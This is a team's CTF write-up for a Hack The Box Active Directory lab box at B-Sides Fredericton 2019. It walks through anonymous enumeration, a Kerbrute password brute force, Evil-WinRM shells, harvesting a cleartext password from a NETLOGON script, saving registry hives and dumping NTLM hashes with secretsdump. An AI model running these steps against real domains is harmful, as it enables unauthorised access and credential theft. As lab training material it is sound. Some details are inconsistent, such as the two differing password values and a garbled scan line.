---
layout: post
title: CTF - B-Sides Fredericton CTF 
subtitle: CTF time, baby!
gh-badge:
  - star
  - fork
  - follow
tags:
  - CTF
  - Kali
  - Impacket
comments: true
published: true
date: '2019-11-16'
---
# Initial disclaimer
I didn't spend a lot of time preparing this writeup, I'm absolutely burnt out from hammering away at this CTF. It lasted roughly 4 hours long and we still maintained first for the whole time (yay!) and it was absolutely exhausting. Well done to the HackTheBox team for putting this together.
Anyways, here it is!
```
Hack The Box B-Sides Fredericton 11/16/2019 Writeup
Team: OwO
Place: First
Box name: FSMO
```

```
Flags: 
Connection Flag: flag{helloworld}
1. flag{Ld4P_an0nyMous_b1nds}
2. flag{DoNt_D1sable_k3rBer0s_pr3-auth3ntic4tion} 
3. flag{cR3dent1@ls_so_expo5ed}
4. X
```

Initial nmap scan:
```
$nmap -sS -p- 10.10.10
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-11-16 17:06:00Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-N
ame)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-N
ame)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)It lasted roughly 4 hours long 
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49674/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc        Microsoft Windows RPC
49677/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
49696/tcp open  msrpc        Microsoft Windows RPC
```
Initial scans reveal a number of active directory related services running. We can gather a handful of information from the scan, such as the Device/AD Name (megacorp.local), Windows RM (take note of that, it will come into play later), SMB, and Kerberos.

Next, we would normally check for low hanging fruit -- SMB is first up. Running Enum4linux on the target machine reveals a lot of information to us, including the first flag:
```
 ==========================  
|    Target Information    | 
 ==========================  
Target ........... 10.10.10.27 
RID Range ........ 500-550,1000-1050 
Username ......... '' 
Password ......... '' 
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none 

 ====================================  
|    Session Check on 10.10.10.27    | 
 ====================================  
[+] Server 10.10.10.27 allows sessions using username '', password '' 
[+] Got domain/workgroup name:  
 
 ==========================================  
|    Getting domain SID for 10.10.10.27    | 
 ==========================================  
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. 
Domain Name: MEGACORP 
Domain Sid: S-1-5-21-3167813660-1240564177-918740779 
[+] Host is part of a domain (not a workgroup) 
 
 =====================================  
|    OS information on 10.10.10.27    | 

[+] Got OS info for 10.10.10.27 from smbclient:  
[+] Got OS info for 10.10.10.27 from srvinfo: 


 ============================  
|    Users on 10.10.10.27    | 
 ============================  
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain 
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system. 
index: 0x1095 RID: 0x44f acb: 0x00000210 Account: dev-batch     Name: dev-batch Desc: (null) 
index: 0x10a8 RID: 0x641 acb: 0x00000210 Account: flag{Ld4P_an0nyMous_  Name: flag{Ld4P_an0nyMous_b1nds}        Desc: (null) 
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain 
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account 
index: 0x10a7 RID: 0x458 acb: 0x00000210 Account: lara  Name: Lara Stein        Desc: (null) 
index: 0x10a5 RID: 0x456 acb: 0x00000210 Account: magnus        Name: Magnus Bilde      Desc: (null) 
index: 0x10a6 RID: 0x457 acb: 0x00000210 Account: matt  Name: Matt Hale Desc: (null) 
index: 0x1097 RID: 0x450 acb: 0x00000210 Account: sonny Name: sonny     Desc: (null) 
index: 0x10a4 RID: 0x455 acb: 0x00010210 Account: svc-netapp    Name: svc-netapp        Desc: (null) 
 
user:[Administrator] rid:[0x1f4] 
user:[Guest] rid:[0x1f5] 
user:[krbtgt] rid:[0x1f6] 
user:[DefaultAccount] rid:[0x1f7] 
user:[dev-batch] rid:[0x44f] 
user:[sonny] rid:[0x450] 
user:[svc-netapp] rid:[0x455] 
user:[magnus] rid:[0x456] 
user:[matt] rid:[0x457] 
user:[lara] rid:[0x458] 
user:[flag{Ld4P_an0nyMous_] rid:[0x641] 
 
 ========================================  
|    Share Enumeration on 10.10.10.27    | 
 ========================================  
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640. 
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.27] 
do_connect: Connection to 10.10.10.27 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) 
 
        Sharename       Type      Comment 
        ---------       ----      ------- 
Error returning browse list: NT_STATUS_REVISION_MISMATCH 
Reconnecting with SMB1 for workgroup listing. 
Failed to connect with SMB1 -- no workgroup available 
 
[+] Attempting to map shares on 10.10.10.27 
 
 ===================================================  
|    Password Policy Information for 10.10.10.27    | 
 ===================================================  
 
 
[+] Attaching to 10.10.10.27 using a NULL share 
 
[+] Trying protocol 445/SMB... 
 
[+] Found domain(s): 
 
        [+] MEGACORP 
        [+] Builtin 
 
[+] Password Info for Domain: MEGACORP 
 
        [+] Minimum password length: 7 
        [+] Password history length: 24 
        [+] Maximum password age: Not Set 
        [+] Password Complexity Flags: 000000 
 
                [+] Domain Refuse Password Change: 0 
                [+] Domain Password Store Cleartext: 0 
                [+] Domain Password Lockout Admins: 0 
                [+] Domain Password No Clear Change: 0 
                [+] Domain Password No Anon Change: 0 
                [+] Domain Password Complex: 0 
 
        [+] Minimum password age: 1 day 4 minutes  
        [+] Reset Account Lockout Counter: 30 minutes  
        [+] Locked Account Duration: 30 minutes  
        [+] Account Lockout Threshold: None 
        [+] Forced Log off Time: Not Set 
 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501. 
 
[+] Retieved partial password policy with rpcclient: 
 
Password Complexity: Disabled 
Minimum Password Length: 7 
 
 
 =============================  
|    Groups on 10.10.10.27    | 
 =============================  
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542. 
 
[+] Getting builtin groups: 
group:[Account Operators] rid:[0x224] 
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] 
group:[Incoming Forest Trust Builders] rid:[0x22d] 
group:[Windows Authorization Access Group] rid:[0x230] 
group:[Terminal Server License Servers] rid:[0x231] 
group:[Administrators] rid:[0x220] 
group:[Users] rid:[0x221] 
group:[Guests] rid:[0x222] 
group:[Print Operators] rid:[0x226] 
group:[Backup Operators] rid:[0x227] 
group:[Replicator] rid:[0x228] 
group:[Remote Desktop Users] rid:[0x22b] 
group:[Network Configuration Operators] rid:[0x22c] 
group:[Performance Monitor Users] rid:[0x22e] 
group:[Performance Log Users] rid:[0x22f] 
group:[Distributed COM Users] rid:[0x232] 
group:[IIS_IUSRS] rid:[0x238] 
group:[Cryptographic Operators] rid:[0x239] 
group:[Event Log Readers] rid:[0x23d] 
group:[Certificate Service DCOM Access] rid:[0x23e] 
group:[RDS Remote Access Servers] rid:[0x23f] 
group:[RDS Endpoint Servers] rid:[0x240] 
group:[RDS Management Servers] rid:[0x241] 
group:[Hyper-V Administrators] rid:[0x242] 
group:[Access Control Assistance Operators] rid:[0x243] 
group:[Remote Management Users] rid:[0x244] 
group:[System Managed Accounts Group] rid:[0x245] 
group:[Storage Replica Administrators] rid:[0x246] 
group:[Server Operators] rid:[0x225]
```
The user account being the flag:
flag{Ld4P_an0nyMous_b1nds}

Reviewing our Enum4Linux output, we can get a number of usernames revealed to us, as well as the password policy.
The users we retrieved are:
```
cn: sonny
userPrincipalName: sonny@MEGACORP.LOCAL
cn: svc-netapp
userPrincipalName: svc-netapp@MEGACORP.LOCAL
cn: Magnus Bilde
userPrincipalName: magnus@MEGACORP.LOCAL
cn: Matt Hale
userPrincipalName: matt@MEGACORP.LOCAL
cn: Lara Stein
userPrincipalName: lara@MEGACORP.LOCAL
cn: flag{Ld4P_an0nyMous_b1nds}
userPrincipalName: flag{Ld4P_an0nyMous_b1nds}@MEGACORP.LOCAL
```
With the user accounts, we can attempt to do more enumeration, however, not much additional information is turned up.

We have to strange accounts that we can look at here, svc-netapp and the flag user account. Using a tool called “Kerbrute” we can brute force the users passwords
```
#./kerbrute_linux_amd64 bruteuser -d megacorp.local /usr/share/seclists/Passwords/darkweb2017-top10000.txt svc-netapp --dc 10.10.10.27
 
  
    __             __               __      
   / /_____  _____/ /_  _______  __/ /____  
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ 
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/ 
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                         
 
Version: v1.0.2 (fd5f345) - 11/16/19 - Ronnie Flathers @ropnop 
 
2019/11/16 15:59:15 >  Using KDC(s): 
2019/11/16 15:59:15 >   10.10.10.27:88 
 
2019/11/16 15:59:15 >  [+] VALID LOGIN:  svc-netapp@megacorp.local:1234567890 
2019/11/16 15:59:16 >  Done! Tested 31 logins (1 successes) in 0.613 seconds
```
Imediately the password of the user account is revealed to us as "1234567890:
However, it was possible using GetNPUsers within the Impacket suite to retrieve a Ticket for the svc-netapp user account.

Now, we can explore the system with either smbclient, or we can invoke a shell using Evil-WinRM
To install Evil-WinRM you can do “gem install evil-winrm”
```
$evil-winrm -i 10.10.10.27 -u svc-netapp
password: 01234567890
*Evil-WinRM* PS C:\Users\svc-netapp\Documents> cd ..\Desktop\
*Evil-WinRM* PS C:\Users\svc-netapp\Desktop> more flag.txt
```
flag{DoNt_D1sable_k3rBer0s_pr3-auth3ntic4tion}

After gaining access to a user account on the system we need to elevate privileges to a different user. To view all the users on the system we can issue the “net users” command
```
------------------------------------------------------------------------------- 
Administrator            DefaultAccount           dev-batch                 
flag{Ld4P_an0nyMous_     Guest                  krbtgt                    
lara                            magnus                   matt                      
sonny                    svc-netapp               
 
 and issuing a dir C:\Users\

Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
d-----        9/25/2019  10:57 AM                Administrator                                                                                                                                                                                           
d-----       11/16/2019   9:47 AM                dev-batch                                                                                                                                                                                               
d-r---       11/20/2016   5:24 PM                Public                                                                                                                                                                                                  
d-----       11/16/2019  12:10 PM                svc-netapp
```
Our options on who to pivot to are fairly limited, our best option is to see if we can find a user account password and or brute force “dev-batch”'s account login.

Exploring SMB, we can see a number of shares listed
```
smbclient -L //10.10.10.27/ -U svc-netapp  
Enter WORKGROUP\svc-netapp's password:  01234567890
 
        Sharename       Type      Comment 
        ---------       ----      ------- 
        ADMIN$          Disk      Remote Admin 
        C$              Disk      Default share 
        Development     Disk       
        dfs             Disk       
        E$              Disk      Default share 
        IPC$            IPC       Remote IPC 
        NETLOGON        Disk      Logon server share  
        SYSVOL          Disk      Logon server share 
```

Scanning each share is incredibly time consuming, but with the 4 of us actively searching we quickly found drive.vbs located in the NETLOGON share. Reading out the file, we are left with “dev-batch”s user account password
```
Dim oNet 
Set oNet = WScript.CreateObject("WScript.Network") 
 
strDrive = "Q:" 
strShare = "\\megacorp.local\development" 
 
strPer = "FALSE" 
strUsr = "dev-batch" 
strPass = "cNh6uC2xgc7@x" 
 
oNet.MapNetworkDrive strDrive, strShare, strPer, strUsr, strPas
```
With our (hopefully) more privileged user account, we can now access their accounts Using Evil-WinRM we can collect another flag!
```
*Evil-WinRM* PS C:\Users\dev-batch\Documents> cd C:\Users\dev-batch\Desktop
*Evil-WinRM* PS C:\Users\dev-batch\Desktop> dir


    Directory: C:\Users\dev-batch\Desktop


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-ar---        9/25/2019   1:58 PM             28 flag.txt                                                                                                                                                                                                


*Evil-WinRM* PS C:\Users\dev-batch\Desktop> more flag.txt
flag{cR3dent1@ls_so_expo5ed}
```
And sure enough, we have another flag. We were unable to root the box within the 4 hour given time frame, however, we did find a number of interesting files. I'll go over how we retrieved some of them:

We could obtain several key hives directly from the registry using
```
reg.exe save hklm\sam E:\sam.hive

reg.exe save hklm\system E:\system.hive
```
Lastly, we found one more aditional sensitive file (ntds.dit) within the C:\System32 folder, we could then pull the files down off the server using a wide variety of methods (personally, we used the open E$ Samba share due to simplicity), then we could dump the password hashes of the user accounts on the system using Secretsdump.py within the Impacket suite. 
```
#./secretsdump.py -sam ./sam -system ./system -ntds ./ntds.dit local
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xbf52866106a6efc249f28895d39f99d3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:da044beedf173cf4ada93d034aa820fb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] Reading and decrypting hashes from /root/Downloads/ntds.dit 
[*] Cleaning up... 
```
Having the admistrator hash, we could do a few things: attempt to preform a Pass-The-Hash attack and authenthicate as the administrator and lastly try to crack the hash itself. Unfortunately, none of these were the intended method, and it was something that we were way way way far off on (sadly), but hey, we still came in first and a win is a win! 
Note:
It was possible to crack the hash, although brute forcing would have been necessary. At the end of the official writeup, the credentials were revealed to be:

``
administrator:qfxvjk9BITxwg584x
``

You can view the full official writeup here: https://ctf.hackthebox.eu/bsides2.pdf
